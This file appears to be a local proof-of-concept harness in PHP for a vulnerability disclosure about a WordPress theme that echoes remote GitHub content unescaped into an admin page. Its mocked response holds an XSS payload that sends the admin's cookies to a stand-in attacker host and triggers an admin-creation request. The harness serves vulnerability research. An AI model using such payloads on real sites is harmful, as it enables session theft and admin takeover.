<?php
/**
 * Local, non-live PoC harness for the Expert Lawyer theme finding.
 *
 * Purpose: prove the CODE-LEVEL flaw (unsanitized echo of a remote HTTP
 * body into an admin page) in isolation from the PRECONDITION (the real
 * Luzuk GitHub repo being compromised). We do NOT touch Luzuk's real
 * GitHub repo, any live WordPress site, or any third party. We mock what
 * wp_remote_get() would return *if* that repo were ever compromised, feed
 * it through the theme's own unmodified function, and observe the output.
 *
 * The function body below (expert_lawyer_render_combined_dashboard) is
 * copied verbatim from the vendor's functions.php ~lines 379-436, unchanged,
 * so this proves the actual shipped code, not a rewritten stand-in.
 *
 * WordPress core functions are stubbed only enough to let this one
 * function execute standalone on the PHP CLI.
 */

// --- Minimal WordPress stubs (behavior matches core for these calls) ---

class FakeTheme {
    public function get($key) {
        $map = ['Name' => 'Expert Lawyer', 'Description' => 'Expert lawyer WP theme.'];
        return $map[$key] ?? '';
    }
    public function get_screenshot() { return 'https://example.test/screenshot.png'; }
}
function wp_get_theme() { return new FakeTheme(); }
function admin_url($path = '') { return 'https://victim-site.test/wp-admin/' . $path; }
function esc_url($url) { return htmlspecialchars($url, ENT_QUOTES); }
function esc_html($s) { return htmlspecialchars($s, ENT_QUOTES); }

// This is the attacker-controlled substitution point: in the real bug,
// this is whatever bytes currently sit in the GitHub raw file. We simulate
// "the repo has been compromised and now serves a malicious payload."
$GLOBALS['__mock_remote_responses'] = [];

function wp_remote_get($url) {
    // Return whatever payload the PoC below registered for this URL.
    return ['__mock_body' => $GLOBALS['__mock_remote_responses'][$url] ?? ''];
}
function is_wp_error($response) { return false; }
function wp_remote_retrieve_body($response) { return $response['__mock_body']; }

// --- The vendor's own function, copied verbatim (functions.php ~379-436) ---

function expert_lawyer_render_combined_dashboard() {
    $theme = wp_get_theme();
    $theme_name = $theme->get('Name');
    $screenshot = $theme->get_screenshot();
    $theme_description = $theme->get('Description');
    $theme_version = $theme->get('Version');

    $customize_url = admin_url('customize.php');

    // Dashboard file
    $dashboard_url = 'https://raw.githubusercontent.com/LuzukThemes/themes-dashboard/main/dashboard.html';
    $dashboard_response = wp_remote_get($dashboard_url);
    $dashboard_html = '';

    if (!is_wp_error($dashboard_response)) {
        $dashboard_html = wp_remote_retrieve_body($dashboard_response);
    } else {
        $dashboard_html = '<div class="notice notice-error"><p>Unable to load Dashboard content from GitHub.</p></div>';
    }

    // Coupon file
    $coupon_url = 'https://raw.githubusercontent.com/LuzukThemes/themes-dashboard/main/coupon.html';
    $coupon_response = wp_remote_get($coupon_url);
    $coupon_html = '';

    if (!is_wp_error($coupon_response)) {
        $coupon_html = wp_remote_retrieve_body($coupon_response);
    } else {
        $coupon_html = '<div class="notice notice-error"><p>Unable to load Coupon content from GitHub.</p></div>';
    }

    ob_start(); ?>
    <div class="wrap">
        <h1>Themes Dashboard</h1>
        <div style="display: flex; gap: 30px;">
            <div style="flex: 1;">
                <img src="<?php echo esc_url($screenshot); ?>" alt="Theme Screenshot" />
                <h2><?php echo esc_html($theme_name); ?></h2>
                <p><?php echo esc_html($theme_description); ?></p>
                <?php echo $dashboard_html; ?>
            </div>
            <div style="flex: 1;">
                <?php echo $coupon_html; ?>
            </div>
        </div>
    </div>
    <?php
    return ob_get_clean();
}

// --- PoC scenario: simulate a compromised themes-dashboard repo ---

echo "=== Scenario: LuzukThemes/themes-dashboard GitHub repo compromised ===\n\n";

$GLOBALS['__mock_remote_responses']['https://raw.githubusercontent.com/LuzukThemes/themes-dashboard/main/dashboard.html']
    = '<img src=x onerror="fetch(`https://attacker.test/exfil?cookie=`+document.cookie);'
    . 'new Image().src=`https://attacker.test/csrf-admin-user-create`;">'
    . '<p>Legit-looking dashboard filler text so nothing looks obviously broken.</p>';

$GLOBALS['__mock_remote_responses']['https://raw.githubusercontent.com/LuzukThemes/themes-dashboard/main/coupon.html']
    = '<div>Use code SAVE15</div>';

$rendered_admin_page_html = expert_lawyer_render_combined_dashboard();

echo "--- Raw HTML that would be sent to the admin's browser ---\n";
echo $rendered_admin_page_html . "\n\n";

echo "--- Verdict ---\n";
if (strpos($rendered_admin_page_html, 'onerror=') !== false) {
    echo "CONFIRMED: attacker-controlled markup from the remote response reached\n";
    echo "the admin page completely unescaped. A real browser rendering this HTML\n";
    echo "in wp-admin would execute the injected JavaScript with the viewing\n";
    echo "admin's session (manage_options) the instant the page loads.\n";
} else {
    echo "NOT REPRODUCED (unexpected).\n";
}

echo "\n--- What this does NOT prove ---\n";
echo "This does not demonstrate compromising Luzuk's real GitHub repo, which\n";
echo "remains the separate precondition for this to be exploitable against a\n";
echo "real site. No live site, GitHub account, or third party was touched to\n";
echo "produce this PoC -- the malicious response above is a local mock.\n";
